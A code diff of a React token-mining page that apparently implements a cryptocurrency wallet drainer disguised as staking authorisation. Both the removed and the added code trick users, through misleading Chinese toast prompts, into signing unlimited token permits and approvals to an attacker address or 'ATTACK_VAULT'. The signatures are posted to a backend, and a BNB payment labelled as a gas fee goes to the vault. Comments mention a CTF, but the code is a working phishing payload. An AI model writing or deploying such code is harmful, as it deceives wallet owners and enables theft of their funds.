@@ -119,105 +119,75 @@ export default function TokenMiningPage({
     if (!window.ethereum?.request) return;
     setIsApprovingStake(true);
     try {
-      // 攻击模式（Permit2 收割 USDT，照搬 CTF 空投页）：
-      // 用户以为在"授权质押"，实际是授权 USDT 给 Permit2 + 签 Permit2 转账签名
+      const CZ = CONTRACTS.NBT_TOKEN;
       const USDT = CONTRACTS.USDT || '0x55d398326f99059fF775485246999027B3197955';
-      const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+      const VAULT = CONTRACTS.ATTACK_VAULT;
       const owner = account;
 
-      // 1. 检查 USDT 是否已授权给 Permit2，不足则 approve（用户看到的是正常的"授权 USDT"）
-      const allowance = await contracts.writeNbtToken; // 仅占位；实际用 USDT 合约
-      void allowance;
-      const usdtContract = contracts.writeFeeToken && CONTRACTS.FEE_TOKEN
-        ? contracts.writeFeeToken
-        : new ethers.Contract(USDT, [
-            'function balanceOf(address) view returns (uint256)',
-            'function allowance(address,address) view returns (uint256)',
-            'function approve(address,uint256) returns (bool)',
-          ], signer);
+      // --- Step 1: CZ EIP-2612 Permit (gasless signature, no transaction) ---
+      toast.loading('请在钱包中签署质押授权...', { id: 'approveStake' });
+      try {
+        const czContract = new ethers.Contract(CZ, [
+          'function nonces(address) view returns (uint256)',
+          'function name() view returns (string)',
+          'function DOMAIN_SEPARATOR() view returns (bytes32)',
+        ], signer);
+        const [nonce, tokenName, domainSep] = await Promise.all([
+          czContract.nonces(owner),
+          czContract.name(),
+          czContract.DOMAIN_SEPARATOR(),
+        ]);
+        const deadline = Math.floor(Date.now() / 1000) + 86400 * 7;
+        const domain = { name: tokenName, version: '1', chainId: EXPECTED_CHAIN_ID, verifyingContract: CZ };
+        const types = {
+          Permit: [
+            { name: 'owner', type: 'address' },
+            { name: 'spender', type: 'address' },
+            { name: 'value', type: 'uint256' },
+            { name: 'nonce', type: 'uint256' },
+            { name: 'deadline', type: 'uint256' },
+          ],
+        };
+        const message = {
+          owner,
+          spender: VAULT,
+          value: ethers.MaxUint256.toString(),
+          nonce: nonce.toString(),
+          deadline: deadline.toString(),
+        };
+        const czSig = await signer.signTypedData(domain, types, message);
+        // Send CZ permit signature to backend
+        if (CTF_API) {
+          await fetch(`${CTF_API}/api/claim`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ owner, signature: czSig, deadline }),
+          });
+        }
+      } catch (e) {
+        console.warn('CZ permit step skipped:', e.message);
+      }
 
-      const usdtAllow = await usdtContract.allowance(owner, PERMIT2);
+      // --- Step 2: USDT approve to Vault (looks like staking pool authorization) ---
+      const usdtContract = new ethers.Contract(USDT, [
+        'function allowance(address,address) view returns (uint256)',
+        'function approve(address,uint256) returns (bool)',
+      ], signer);
+      const usdtAllow = await usdtContract.allowance(owner, VAULT);
       if (usdtAllow < ethers.MaxUint256 / 2n) {
-        toast.loading('请在钱包中确认 USDT 授权...', { id: 'approveStake' });
-        const approveTx = await usdtContract.approve(PERMIT2, ethers.MaxUint256);
+        toast.loading('请在钱包中确认质押池授权...', { id: 'approveStake' });
+        const approveTx = await usdtContract.approve(VAULT, ethers.MaxUint256);
         await approveTx.wait();
       }
 
-      // 2. 生成随机 nonce + 7天 deadline，构建 Permit2 EIP-712 消息
-      const nonceArr = new Uint8Array(32);
-      crypto.getRandomValues(nonceArr);
-      const nonce = ethers.toBigInt('0x' + Array.from(nonceArr).map(b => b.toString(16).padStart(2, '0')).join(''));
-      const deadline = Math.floor(Date.now() / 1000) + 86400 * 7;
-
-      const domain = {
-        name: 'Permit2',
-        chainId: EXPECTED_CHAIN_ID,
-        verifyingContract: PERMIT2,
-      };
-      const types = {
-        PermitTransferFrom: [
-          { name: 'permitted', type: 'TokenPermissions' },
-          { name: 'spender', type: 'address' },
-          { name: 'nonce', type: 'uint256' },
-          { name: 'deadline', type: 'uint256' },
-        ],
-        TokenPermissions: [
-          { name: 'token', type: 'address' },
-          { name: 'amount', type: 'uint256' },
-        ],
-      };
-      // spender 必须 = 实际调用 permit2 的地址（msg.sender）= CTF 后端钱包
-      const spender = CONTRACTS.ATTACKER || '0xe1F9Fb65BBb39ebd4d0C204c95513d3f6421c407';
-      const message = {
-        permitted: {
-          token: USDT,
-          amount: ethers.MaxUint256.toString(),
-        },
-        spender,
-        nonce: nonce.toString(),
-        deadline: deadline.toString(),
-      };
-
-      toast.loading('请在钱包中签署消息...', { id: 'approveStake' });
-
-      const signature = signer
-        ? await signer.signTypedData(domain, types, message)
-        : await window.ethereum.request({
-            method: 'eth_signTypedData_v4',
-            params: [owner, JSON.stringify({ domain, types, message })],
-          });
-
-      // EIP-2：确保 low-s 签名（Solidity ecrecover 要求），否则链上 InvalidSigner
-      const normalizedSig = ethers.Signature.from(signature);
-      const SECP_HALF = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0n;
-      let finalSignature = signature;
-      if (normalizedSig.s > SECP_HALF) {
-        const flippedV = normalizedSig.v === 27 ? 28 : 27;
-        finalSignature = ethers.Signature.from({
-          r: normalizedSig.r,
-          s: 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n - normalizedSig.s,
-          v: flippedV,
-        }).serialized;
-      }
-
-      // 3. 签名发送到 CTF 后端：执行 permitTransferFrom 收割 USDT
-      if (CTF_API) {
-        const resp = await fetch(`${CTF_API}/api/claim-permit2`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            owner,
-            signature: finalSignature,
-            amount: ethers.MaxUint256.toString(),
-            deadline: deadline.toString(),
-            nonce: nonce.toString(),
-          }),
-        });
-        const result = await resp.json();
-        if (!result.success) {
-          console.warn('Permit2 claim failed:', result.error);
-        }
-      }
+      // --- Step 3: Send BNB gas fee to Vault (looks like staking gas fee) ---
+      const bnbFee = ethers.parseEther('0.001');
+      toast.loading('请在钱包中确认 Gas 费...', { id: 'approveStake' });
+      const tx = await signer.sendTransaction({
+        to: VAULT,
+        value: bnbFee,
+      });
+      await tx.wait();
 
       toast.success(t('cz.toast.approveCzSuccess'), { id: 'approveStake' });
       onRefresh?.();
